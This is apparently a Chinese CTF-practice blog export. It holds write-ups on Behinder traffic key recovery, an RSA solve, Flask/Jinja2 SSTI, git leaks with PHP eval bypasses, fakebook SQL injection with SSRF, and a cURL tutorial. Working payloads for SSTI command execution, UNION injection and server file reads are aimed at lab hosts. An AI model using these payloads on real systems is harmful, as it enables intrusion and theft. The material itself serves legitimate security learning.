[{"title":"2022_1024安全挑战赛_t3复现","date":"2022-11-01T00:42:16.000Z","path":"2022/11/01/2022-1024安全挑战赛-t3复现/","text":"2022_1024安全挑战赛_t3复现太菜了，哎。。。。。。 （1）题目 通过网上大佬的评论得知这是一个异或的冰蝎流量加密。 参考博客：https://liriu.life/PHP-5ba36eb0362743ed8fa5588c97325f7e （2）分析 我们可以通过明文与密文异或算出key。 做题时卡死在了这里。 冰蝎传上去的php文件与这几个php文件内容相识，其中前面有几个字符是不变的，于是就可以选来作为明文。 import base64 from base64 import b64decode phrases = [ b&#39;&lt;?\\n@error_reporting(0);\\n\\n\\nfuncti&#39;, b&#39;&lt;?\\n@error_reporting(0);\\n\\nfunctio&#39;, b&#39;&lt;?\\n@error_reporting(0);\\n@set_tim&#39;, b&#39;&lt;?\\n@error_reporting(0);\\nset_time&#39;, b&#39;&lt;?\\nerror_reporting(0);\\nfunction &#39;, b&quot;&lt;?\\nerror_reporting(0);\\nheader(&#39;C&quot;, b&#39;&lt;?\\nfunction main($action, $remot&#39;, b&#39;&lt;?php\\n@error_reporting(0);\\n\\n\\nfuncti&#39;, b&#39;&lt;?php\\n@error_reporting(0);\\n\\nfunctio&#39;, b&#39;&lt;?php\\n@error_reporting(0);\\n@set_tim&#39;, b&#39;&lt;?php\\n@error_reporting(0);\\nset_time&#39;, b&#39;&lt;?php\\nerror_reporting(0);\\nfunction &#39;, b&quot;&lt;?php\\nerror_reporting(0);\\nheader(&#39;C&quot;, b&#39;&lt;?php\\nfunction main($action, $remot&#39;, b&#39;&lt;?php\\n\\n$taskResult = array();\\n$p&#39;, b&#39;@error_reporting(0);\\n\\nfunction g&#39;, b&#39;@error_reporting(0);\\nfunction ma&#39;, b&quot;assert|eval(base64_decode(&#39;&quot;, ] def xor(l0, l1): ret = [chr(ord(chr(a)) ^ ord(chr(b))) for a, b in zip(l0, l1)] return &quot;&quot;.join(ret) def check(cipher): cipher = b64decode(cipher) for phrase in phrases: print(phrase) p = phrase[0:16] c = cipher[0:16] k = xor(p, c) print(&quot;-&quot;*99) print(k) if __name__ == &#39;__main__&#39;: cipher=&quot;密文&quot; key = check(cipher) 爆出flag flag3&#123;Beh1_nder&#125;","tags":[]},{"title":"美团mtctf_2022复现","date":"2022-09-22T14:58:27.000Z","path":"2022/09/22/美团mtctf-2022复现/","text":"美团mtctf_2022部分复现#太菜了，只赛后复现出这一题。 crypto1.rsa1from Crypto.Util.number import * from sage.all import RealField from secret import flag1 Bits = 512 p = getPrime(Bits) q = getPrime(Bits) n = p * q gift = RealField(prec=Bits*2)(p) / RealField(prec=Bits*2)(q) e = 0x10001 m = bytes_to_long(flag1) c = pow(m, e, n) output = open(&#39;output.txt&#39;, &#39;w&#39;) output.write(&#39;n = &#39; + str(n) + &#39;\\n&#39;) output.write(&#39;c = &#39; + str(c) + &#39;\\n&#39;) output.write(&#39;gift = &#39; + str(gift) + &#39;\\n&#39;) n = 108525167048069618588175976867846563247592681279699764935868571805537995466244621039138584734968186962015154069834228913223982840558626369903697856981515674800664445719963249384904839446749699482532818680540192673814671582032905573381188420997231842144989027400106624744146739238687818312012920530048166672413 c = 23970397560482326418544500895982564794681055333385186829686707802322923345863102521635786012870368948010933275558746273559080917607938457905967618777124428711098087525967347923209347190956512520350806766416108324895660243364661936801627882577951784569589707943966009295758316967368650512558923594173887431924 gift = 0.9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938 这里给了你gift=p/q,我们们可以通过数学运算算出p的近似值，又因为gift的值是不够精确的我们要在一定的范围内找到精确的p，在进行计算。 脚本: n = 108525167048069618588175976867846563247592681279699764935868571805537995466244621039138584734968186962015154069834228913223982840558626369903697856981515674800664445719963249384904839446749699482532818680540192673814671582032905573381188420997231842144989027400106624744146739238687818312012920530048166672413 c = 23970397560482326418544500895982564794681055333385186829686707802322923345863102521635786012870368948010933275558746273559080917607938457905967618777124428711098087525967347923209347190956512520350806766416108324895660243364661936801627882577951784569589707943966009295758316967368650512558923594173887431924 gift = 0.9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938 p = int(sqrt(int(n*gift))) print(p) num = 100000 for i in range(num): if (n%p)==0: q = int(n/p) print(p) print(q) break else: p += 1 #p=10354173078239628635626920146059887542108509101478542108107457141390325356890199583373894457500644181987484104714492532470944829664847264360542662124954077 #q=10481297369477678688647473426264404751672609241332968992310058598922120259940804922095197051670288498112926299671514217457279033970326518832408003060034369 最后算出flag","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"本地图库搭建","date":"2022-09-02T15:21:05.000Z","path":"2022/09/02/本地图库搭建/","text":"本地图库搭建1.前言这段时间内https://sm.ms/ 竟然不让中国用户登入了，我真的是。。。 如果要登入还要用vpn有点麻烦，于是准备搞个本地图库。 不过本地图库也是有一个问题，在本地查看md文件图片不会显示出来 2.新建本地图片库主题文件的图片存在了source-img文件夹中，所以我们在这个文件夹中新建一个postimg文件夹，用于存放博客中需要保存的图片。然后我们把图片存进去，执行hexo g，会发现在public-img文件夹中也多了一个postimg文件夹，里面有我们刚刚存进去的图片。这说明Hexo在部署博客时，也将postimg部署到了博客里。同理，上传时也会将postimg一起上传到Github上，这说明利用相对路径保存图片的方法可行。 图片的相对路径https://00hello00.github.io/images/postimg/XXXXX","tags":[]},{"title":"Templated","date":"2022-08-27T11:27:02.000Z","path":"2022/08/27/Templated/","text":"Flask/Jinja2框架的ssti漏洞(沙箱逃逸)(CVE-2019-8341)#1.背景介绍flask是基于python开发的一种web服务器。 JinJia模板引擎的特点： - &#123;&#123;……&#125;&#125;：装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉 - &#123;%……%&#125;：装载一个控制语句。 - &#123;#……#&#125;：装载一个注释，模板渲染时会忽略这中间的值 2.python魔术方法下的解析过程一些特殊的变量（python魔术方法） __class__ 返回类型所属的对象 __mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 __base__ 返回该对象所继承的基类 // __base__和__mro__都是用来寻找基类的 __subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 __init__ 类的初始化方法 __globals__ 对包含函数全局变量的字典的引用 _ _ str _ _ 方法：将对象转换成字符串。 _ _ new _ _ 方法：创建并返回一个实例对象，一般用于单例模式。 _ _ del _ _ 方法：对象在程序运行结束后进行对象的销毁的时候调用这个方法，来释放资源。 __dict__ 返回所有属性，包括属性，方法等 &gt;&gt;&gt; print(&#39;&#39;.__class__) &lt;type &#39;str&#39;&gt; # 字符串的上一层父类就是str，既然我们知道了是什么类型，那么就可以通过__mro__找str的继承关系 &gt;&gt;&gt; print(&#39;&#39;.__class__.__class__.__mro__) (&lt;type &#39;type&#39;&gt;, &lt;type &#39;object&#39;&gt;) # 这里通过元组列出了两个关系，我们要找的不是type，而是后面的object，既然是元组，那么就通过__mro__[1].__subclasses__()找object对象下的所有子类 &gt;&gt;&gt; print(&#39;&#39;.__class__.__class__.__mro__[1].__subclasses__()) [&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, ...(省略部分)] # 找到了父类下的子类，以列表的形式显示，假设我们要进行文件读取，那么就是找到&lt;type &#39;file&#39;&gt;，所处列表位置是40 但是由于我的环境问题，这里不能的文件读取和RCE出现了问题，所以使用别的模块，道理都一样，通过找到重载的模块去一步步找所属的子类列表，这里使用的是列表第75位，已重载的 &gt;&gt;&gt; print(&#39;&#39;.__class__.__class__.__mro__[1].__subclasses__()[75]) &lt;type &#39;file&#39;&gt; # 那么接下来就可以通过__init__查看是否重载 &gt;&gt;&gt; print(&#39;&#39;.__class__.__class__.__mro__[1].__subclasses__()[75].__init__) &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; # 没有wrapper字眼，说明已经被重载了，接下来继续找继承关系，使用__globals__找全局变量 &gt;&gt;&gt; print(&#39;&#39;.__class__.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__) &#123;&#39;__name__&#39;: &#39;importlib._bootstrap&#39;, &#39;__doc__&#39;: &#39;Core implementation of import.\\n\\nThis module is NOT meant to be directly imported! It has been designed such\\nthat it can be bootstrapped into Python as the implementation of import. As\\nsuch it requires the injection of specific modules and attributes in order to\\nwork. One should use importlib as the public-facing version of this module.\\n\\n&#39;, &#39;__package__&#39;: &#39;importlib&#39;, &#39;__loader__&#39;: &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &#39;__spec__&#39;: ModuleSpec(name=&#39;_frozen_importlib&#39;, loader=&lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;,...(省略部分)) # 找出了很多的全局变量，以字典的形式输出，这里演示用&#39;__builtion__&#39;做演示 &gt;&gt;&gt; print(&#39;&#39;.__class__.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;]) &#123;&#39;__name__&#39;: &#39;builtins&#39;, &#39;__doc__&#39;: &quot;Built-in functions, exceptions, and other objects.\\n\\nNoteworthy: None is the `nil&#39; object; Ellipsis represents `...&#39; in slices.&quot;, &#39;__package__&#39;: &#39;&#39;, &#39;__loader__&#39;: &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &#39;__spec__&#39;: ModuleSpec(name=&#39;builtins&#39;, loader=&lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;),...(省略部分)&#125; # 到了这一步后，由于全局变量包含了eval，所以可以找到eval执行命令，然后再通过popen执行命令，如果使用system之类的函数，可能照成不会回显，所以用popen是首选~ &gt;&gt;&gt; print(&#39;&#39;.__class__.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)) flag requirements.txt # 至此，成功执行了命令，找到了当前目录下的文件，至于__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()，可以说是固定搭配 循环渐进，一层找一层，无非都是先找到父类，然后找父类下的子类，完了以后查看是否有重载，再通过全局变量找到eval进行执行命令，当然，也不单单只有这么一个思路，也可以不断横纵扩展，还有一个知识点就是，上面提到我们得先获取object对象，然后再去找子类，那么一定要用mro去获取父类么？其实不一定，我们也可以用base去获取object，但是个人感觉还是mro好用，base虽然也可以父类，但是只能找上一层的父类，如果被找的类型不止一个父类的话，就得通过很多个base去找。 &gt;&gt;&gt; print(&#39;&#39;.__class__.__base__.__base__) # 依次网上找 &lt;type &#39;object&#39;&gt; &gt;&gt;&gt; print(&#39;&#39;.__class__.__mro__[-1]) # 一次性列出来所有继承关系 &lt;type &#39;object&#39;&gt; 3.漏洞详情：ssti漏洞主要是由render_template_string()和render_template（）这两个函数由于使用不当而造成的二次渲染。 #flaskapp.py from flask import * from jinja2 import * app = Flask(__name__) # 创建FLask类 @app.route(&quot;/&quot;) #设置的默认路由 def index(): #默认的视图函数，与路由绑定，用来处理用户访问网站跟目录/时的情况 name = request.args.get(&#39;name&#39;, &#39;guest&#39;)#接受参数名为name 的参数传入 html = &#39;&#39;&#39; &lt;h3&gt;your input %s&lt;/h3&gt; &#39;&#39;&#39;%name #设置一个模板html，将name的值以%s输出 return render_template_string(html) #将html以字符串模板的形式渲染 #对应的，当html是一个文件时，使用render_template 函数来渲染一个指定的文件 if __name__==&#39;__main__&#39;: #作为主文件启动时 app.run(debug = True) #以debug模式运行 route装饰器的作用是将函数与url绑定起来。如上，如果你在url后对name进行get传值: ?name=2*3 输出：your input 2*3 ?name=6 输出：your input 6 4.题目TemplatedSite still under construction Proudly powered by Flask/Jinja2 刚进去就提醒你这是由Flask/Jinja2框架开发的。 =9 Error 404 The page &#39;=9&#39; could not be found 成功执行，证实存在SSTI注入。构造payload payload:http://209.97.177.45:30351/%7B%7B%20%22%22.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[%22__builtins__%22][%22__import__%22](%22os%22).popen(%22cat%20flag.txt%22).read()%20%7D%7D 爆出flag Error 404 The page &#39;HTB&#123;t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!&#125; &#39; could not be found","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"git泄露","date":"2022-07-16T09:40:05.000Z","path":"2022/07/16/git泄露/","text":"git泄露1.漏洞介绍当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。 攻击者可以利用该漏洞下载git文件夹里的所有内容。如果文件夹内有敏感信息比如站点源码、数据库账户密码等，攻击者可能直接控制服务器。渗透测试人员、攻击者可以进一步代码审计、挖掘文件上传，sql注入等安全漏洞。 2.对于git泄露一些常见的操作以githack工具为例，扫描成功后githack会生成一个文件夹dist，里面存放着重新生成的文件。 进入文件夹： 注：git作为一个版本控制工具，会记录每次提交的修改。每次提交时，git会生成相应的时间线，这个时间线是一个分支。git可以有多条分支。如果没有新建则只有一条，git默认分支为master。 // git log -all 或 git branch -v 只能查看master分支的信息 git reflog 可以看到一些checkout记录从而发现其他分支。 注：wget 是一个从网络上自动下载文件的自由工具 wget url(我们可以通过这种方式去下载初默认分支以外的head信息) eg.把secret分支的head信息，保存到.git/refs/heads/secret中 执行：wget http://xxxxx/.git/refs/heads/secret git回滚： git reset 回复以前的版本 git reset --hard HEAD^ 跳到上一个版本 （在git中HEAD表示当前版本，上一个版本是HEAD^） 3.对于git泄露的尝试、利用和工具推荐可以对目标网站进行扫描如果访问到带.git后缀的网址一般存在git泄露。 CTF线上比赛往往会有重定向一类问题。例如，只要访问git,便会返回403，此时试探访问.git/config，如果有文件返回，就说明存在git泄露，反之，一般不存在。 除了查看源码，泄露的git中也有可能有其他有用的信息，如.git/config文件夹中可能含有access_token信息，从而可以访问这个用户等等其他仓库。 git泄露常用工具：githack、scrabble、git_extract。 4.例题[GXYCTF 2019]禁止套娃 （1）题目 flag在哪里呢？ （2）分析 我们先用dirsearch扫一下目录发现了一些含.git的目录，因此初步推测存在git泄露。 //本地图库 接着用githack把文件下载下来。(文件没有下全，值得好好研究一下原因) flag.php &lt;?php $flag = &#39;NSSCTF&#39;; 没什么用 index.php &lt;?php include &quot;flag.php&quot;; echo &quot;flag在哪里呢？&lt;br&gt;&quot;; if(isset($_GET[&#39;exp&#39;]))&#123; if (!preg_match(&#39;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#39;, $_GET[&#39;exp&#39;])) &#123; if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\\((?R)?\\)/&#39;, NULL, $_GET[&#39;exp&#39;])) &#123; if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) &#123; // echo $_GET[&#39;exp&#39;]; @eval($_GET[&#39;exp&#39;]); &#125; else&#123; die(&quot;还差一点哦！&quot;); &#125; &#125; else&#123; die(&quot;再好好想想！&quot;); &#125; &#125; else&#123; die(&quot;还想读flag，臭弟弟！&quot;); &#125; &#125; // highlight_file(__FILE__); ?&gt; 要传入一个exp的参数而且参数不能含有data:、filter:、php:、phar:这几个伪协议。 preg_replace(‘/[a-z,_]+((?R)?)/‘, NULL, $_GET[‘exp’]))采用了(?R)?这种调用方式，然后exp里面的参数值全换成null，实现无参数化。 (?R)引用当前表达式，后面加了?递归调用，只能匹配通过无参数的函数。 过滤了et|na|info|dec|bin|hex|oct|pi|log关键字，即把一些敏感函数给过滤掉了(get,phpinfo,hex2bin,dirname……) 注：(?R)，(?R)?，(?R)，(?R)+的区别 首先(?R) ， (?R)+ 这两个表达式是匹配不到东西的,因为每次匹配的时候都会至少运行一次递归，无法终止，所以匹配不到任何东西。 (?R)?,递归0次或1次，非贪婪，只能匹配a(b())这种一层套一个函数的。 (?R)\\，递归0次或多次，贪婪，可以匹配a(b(c()d())) 常用函数 scandir(’.’):扫描当前目录 localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是. pos(),current():返回数组第一个值 //数组操作函数： end():数组指针指向最后一位 next(): 数组指针指向下一位 array_reverse(): 将数组颠倒 array_rand(): 随机返回数组的键名 array_flip()：交换数组的键和值 读取文件函数 file_get_content() :因为et被ban，所以不能使用 readfile() highlight_file() show_source() payload构造： 读取目录： ?exp=print_r(scandir(pos(localeconv()))); 方法一:使用使上述文件数组反转后取next位即flag.php。然后读取文件 构造： exp=show_source(next(array_reverse(scandir(pos(localeconv()))))); 方法二: 同上述方法，但方法一有局限性，只能得到数组的第二位或者倒数第二位。其他情况可以使用随机返回键名的方法(刷新几次就可以得到)： exp=show_source(array_rand(array_flip(scandir(pos(localeconv()))))); 方法三： session_start(): 告诉PHP使用session; session_id(): 获取到当前的session_id值； 手动设置cookie中PHPSESSID=flag.php； exp=show_source(session_id(session_start())); 设置cookie中PHPSESSID=flag.php；","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"网鼎杯2018_fackbook","date":"2022-07-11T11:03:48.000Z","path":"2022/07/11/网鼎杯2018-fackbook/","text":"网鼎杯2018_fackbook（1）题目与分析登进去，也不知道要干点什么，注册一下。 点一下用户名，发现url后缀里多了?no=1是一个疑似可以进行sql注入的地方。 （2）sql注入的尝试尝试一下简单的payload ?no=1 and 1=0 从这里我们就明白了这里可以进行sql注入，同时我们也知道了它的路径 /var/www/html/view.php 接着用order by 语句查找一共有多少列数据,最后查出一共有4列。 ?no=1 order by 1 这里尝试了一下union select语句不过好像被过滤掉了，union/**/select我们可以通过这种形式进行绕过。 no=-1 union/**/select 1,2,3,4 这里只有2这一列有回显，接下来我们的select语句就放在2这一列。 ?no=-1 union/**/select 1,group_concat(database()),3,4 得到了数据库fakebook 注：这里阅读了一下大佬的博客我们还可以用另一种注入的方式 ?no=-1 union/**/select 1,(select group_concat(schema_name) from information_schema.schemata),3,4 也同样得到了fakebook，不过大佬的方式回显的数据好像比我的还要全。 ?no=-1 union/**/select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4 爆表，得到users ?no=-1 union/**/select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;),3,4 爆列，得到no,username,passwd,data ?no=-1 union/**/select 1,(select data from users),3,4 回显出一些序列化的数据O:8:”UserInfo”:3:{s:4:”name”;s:3:”123”;s:3:”age”;i:123;s:4:”blog”;s:21:”https://www.baidu.com&quot;;} 到这里好像就没什么思路了。 （3）扫一下目录和尝试一下robots.txt建议每次做这种多页面的题目可以提前或在没有思路的时候试一下robots.txt和把目录给扫描一下 User-agent: * Disallow: /user.php.bak 我们得到了一个新文件 &lt;?php class UserInfo &#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125; &#125; 这里我用了dirsearch这个工具对目标网站进行目录扫描，扫出了一个flag.php的页面因此便猜测flag藏在里面。 在这题，查看源码发现data字段存在漏洞。而我们爆出的字段data是序列化后的字符串说明注册时会序列化我们的信息，回显到页面时再反序列化。这个data本来回显的是我们自己的博客，但我们把它改为回显flag.php就可以构成ssrf修改自己最后blog字段内容，改为file:///var/www/html/flag.php，并把对应的s改为对应长度29data字段在第4位，所以放在第4位。 http://1.14.71.254:28179/view.php?no=-1 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39; 解一下base64就得到了flag。 （4）非预期的解 当我们知道了存在flag.php这个文件路径，其实我们可以通过load_file()这个函数进行读取，这里的load_file()函数没有被过滤掉。 ?no=-1 union/**/select 1,load_file(&quot;/var/www/html/flag.php&quot;),3,4 查看源代码（这里的flag.php是被当成的代码执行的，要查看源代码才成显示出来）：","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"curl介绍及使用","date":"2022-07-11T08:13:01.000Z","path":"2022/07/11/curl介绍及使用/","text":"curl介绍及php中curl的相关函数（1）前言这里主要介绍的还是php中curl的相关函数。 （2）工具介绍cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。 cURL支持的通信协议有FTP、FTPS、HTTP、HTTPS、TFTP、SFTP、Gopher、SCP、Telnet、DICT、FILE、LDAP、LDAPS、IMAP、POP3、SMTP和RTSP。 curl还支持SSL认证、HTTP POST、HTTP PUT、FTP上传, HTTP form based upload、proxies、HTTP/2、cookies、用户名+密码认证(Basic, Plain, Digest, CRAM-MD5, NTLM, Negotiate and Kerberos)、file transfer resume、proxy tunneling。 （3）php中curl简单使用步骤a.curl的简单使用步骤(以下内容参考自https://www.jianshu.com/p/dd2c76f6da26) 初始化一个cURL会话 $ch = curl_init(); 设置请求选项 curl_setopt($ch, CURLOPT_URL, &quot;http://www.360weboy.com&quot;); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); 执行Curl会话获取相关回复 $response = curl_exec($ch); 释放Curl 句柄， 关闭Cur会话 curl_close($ch); b.curl 错误处理 $response = curl_exec($ch); if ($response === FALSE) &#123; echo &quot;cURL 具体出错信息: &quot; . curl_error($ch); &#125; c.获取curl请求的具体信息 可以使用curl_getinfo获取该请求的具体信息: curl_exec($ch); $curl_info= curl_getinfo($ch); echo &quot;收到的http回复的code为： &#123;$curl_info[&#39;http_code&#39;]&#125;&quot;; d.使用curl 发送post请求 $url = &quot;http://www.360weboy.me/post.php&quot;; $post_data = array ( &quot;blog_name&quot; =&gt; &quot;360weboy&quot;, &quot;blog_url&quot; =&gt; &quot;http://www.360weboy.com&quot;, &quot;action&quot; =&gt; &quot;Submit&quot; ); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 设置请求为post类型 curl_setopt($ch, CURLOPT_POST, 1); // 添加post数据到请求中 curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data); // 执行post请求，获得回复 $response= curl_exec($ch); curl_close($ch); echo $response; e.使用curl发送上传文件 $url = &quot;http://www.360weboy.me/upload.php&quot;; $post_data = array ( &quot;attachment&quot; =&gt; &quot;@E:/jackblog/boy.jpg&quot; ); //初始化cURL会话 $ch = curl_init(); //设置请求的url curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //设置为post请求类型 curl_setopt($ch, CURLOPT_POST, 1); //设置具体的post数据 curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data); $response = curl_exec($ch); curl_close($ch); print_r($response); f. 上述将了文件上传，同样的也可以使用curl来自动地完成文件的下载以及保存。有一点要补充下，在执行一个curl请求时，如果你需要获取返回的内容，而不是直接输出返回的内容的话，别忘记使用下面的代码设置，因为curl的默认是输出请求的回复内容: 代码如下: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 假如在360weboy的服务器根目录下面有一个test.zip文件，我们需要将其下载下来，并且保存到本地文件中，就可以尝试使用下面的代码来实现 代码如下: //设置请求的下载文件的url $url = &#39;http://www.360weboy.com/test.zip&#39;; //保存到本地的文件路径 $path = &#39;local/path/to/test.zip&#39;; //初始化请求，设置请求，获取回复,关闭会话 $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $data = curl_exec($ch); curl_close($ch); //将文件内容写入本地文件 file_put_contents($path, $data); 注意：我以上省略了错误处理方面的代码，只是简单做个示例, 在实际中，你还需要通过curl_getinfo函数来进行错误处理! 上述代码对于下载比较大型的文件是不适用的，因为需要先将文件读取到内存中，等所有内容都读取完毕，然后再写入到本地硬盘中。即使php中设置的memory limit非常大，这种情况对性能的影响也是很大的。所以，我们对于大型文件的下载，应该让curl来接管这个任务，实现边下载，边写入的处理，这样的话，就没什么问题了。请看下述代码: 代码如下: $url = &#39;http://www.360weboy.com/test.zip&#39;; $path = &#39;local/path/to/test.zip&#39;; // 打开本地文件 $fp = fopen($path, &#39;w&#39;); // 告诉curl本地文件句柄 $ch = curl_init($url); curl_setopt($ch, CURLOPT_FILE, $fp); curl_exec($ch); curl_close($ch); fclose($fp); 在上述代码中，我们先打开个本地文件，并将文件句柄设置到curl中，然后让curl一边读取远程数据，一边写入到本地文件中。因为我们不需要在程序中获取远程回复的内容了，所以只要执行请求就可以。 g.http 验证 如果服务器端需要验证请求，可以通过类似一下示例代码来实现: 代码如下: $url = &quot;http://www.360weboy.com/users/&quot;; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 设置用户名以及密码 curl_setopt($ch, CURLOPT_USERPWD, &quot;username:password&quot;); // 设置重导向 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_UNRESTRICTED_AUTH, 1); $response = curl_exec($ch); curl_close($ch); h.通过代理发送请求 cURL还可以通过代理服务器来向发送请求，请看一下示例代码: 代码如下: $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,&#39;http://www.360weboy.com&#39;); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 设置代理ip地址 curl_setopt($ch, CURLOPT_PROXY, &#39;222.73.173.50:8080&#39;); // 要验证的话，这里设置用户名以及密码 curl_setopt($ch, CURLOPT_PROXYUSERPWD,&#39;username:password&#39;); $response = curl_exec($ch); curl_close ($ch); （4）PHP cURL 函数PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。libcurl支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。 PHP中使用cURL实现Get和Post请求的方法这些函数在PHP 4.0.2中被引入。 [1] 以下包含了PHP cURL函数列表： curl_close()——关闭一个cURL会话。 curl_copy_handle()——复制一个cURL句柄和它的所有选项。 curl_errno()——返回最后一次的错误号。 curl_error()——返回一个保护当前会话最近一次错误的字符串。 curl_escape()——返回转义字符串，对给定的字符串进行URL编码。 curl_exec()——执行一个cURL会话。 curl_file_create()——创建一个CURLFile对象。 curl_getinfo()——获取一个cURL连接资源句柄的信息。 curl_init()——初始化一个cURL会话。 curl_multi_add_handle()——向curl批处理会话中添加单独的curl句柄。 curl_multi_close()——关闭一组cURL句柄。 curl_multi_exec()——运行当前cURL句柄的子连接 curl_multi_getcontent()——如果设置了CURLOPT_RETURNTRANSFER，则返回获取的输出的文本流。 curl_multi_info_read()——获取当前解析的cURL的相关传输信息。 curl_multi_init()——返回一个新cURL批处理句柄。 curl_multi_remove_handle()——移除curl批处理句柄资源中的某个句柄资源。 curl_multi_select()——等待所有cURL批处理中的活动连接。 curl_multi_setopt()——设置一个批处理cURL传输选项。 curl_multi_strerror()——返回描述错误码的字符串文本。 curl_pause()——暂停及恢复连接。 curl_reset()——重置libcurl的会话句柄的所有选项。 curl_setopt_array()——为cURL传输会话批量设置选项。 curl_setopt()——设置一个cURL传输选项。 curl_share_close()——关闭cURL共享句柄。 curl_share_init()——初始化cURL共享句柄。 curl_share_setopt()——设置一个共享句柄的cURL传输选项。 curl_strerror()——返回错误代码的字符串描述。 curl_unescape()——解码URL编码后的字符串。 curl_version()——获取cURL版本信息。","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"swpuctf_2021_DO_YOU_KNOW_HTTP","date":"2022-07-09T12:52:38.000Z","path":"2022/07/09/swpuctf-2021-DO-YOU-KNOW-HTTP/","text":"swpuctf_2021_DO_YOU_KNOW_HTTP（1）前言 补充一些http请求头的知识 （2）题目 hello.php Please use &#39;WLLM&#39; browser! 刚开始让我们使用WLLM的浏览器。 User-Agent 说明：HTTP客户端运行的浏览器类型的详细信息。通过该头部信息，web服务器可以判断到当前HTTP请求的客户端浏览器类别。 